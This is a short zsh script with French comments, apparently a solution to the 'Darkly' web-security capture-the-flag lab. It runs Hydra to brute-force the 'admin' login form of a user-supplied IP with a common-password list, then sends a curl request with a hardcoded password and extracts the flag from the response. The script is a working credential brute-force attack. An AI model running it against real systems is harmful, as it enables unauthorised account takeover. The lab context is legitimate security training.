#!/bin/zsh

# Affiche un message à l'utilisateur pour demander l'adresse IP
echo "Script de brutforce\n\nDonne l'IP stp :"

# Lecture de l'IP fournie par l'utilisateur et stockage dans la variable IP_DARKLY
read  IP_DARKLY

# Vérifie si l'IP est vide (non fournie), et si c'est le cas, affiche un message d'erreur et termine le script
if [ -z $IP_DARKLY ]; then
    echo "Donne l'IP j'ai dit !"
    exit 1
fi

# Exécution de Hydra pour essayer une liste de mots de passe (10000-most-common-passwords.txt)
# -l spécifie l'utilisateur (admin)
# -P spécifie la liste de mots de passe
# -F arrête l'attaque dès qu'une correspondance est trouvée
# -V affiche les détails de chaque tentative
# "$IP_DARKLY" est l'IP fournie par l'utilisateur, utilisée dans l'attaque
hydra -l admin -P 10000-most-common-passwords.txt -F -V "$IP_DARKLY" http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif'

# Demande à l'utilisateur de fournir un mot de passe spécifique pour le tester manuellement
echo "\n\nT'es chaud on test le mot de passe ?"

# petite pause pour laisser le temps à l'utilisateur de lire le message
read NOTHING

# Utilisation de curl pour tester le mot de passe fourni sur le serveur
# - Envoie une requête HTTP
# - Recherche ensuite la présence du mot "flag" dans la réponse avec grep
# - awk extrait la partie de la réponse contenant le flag entre ":" et "<"
curl "http://$IP_DARKLY/index.php?page=signin&username=admin&password=shadow&Login=Login#" | grep flag | awk -F': | <' '{print "\nThe flag => "$2}'
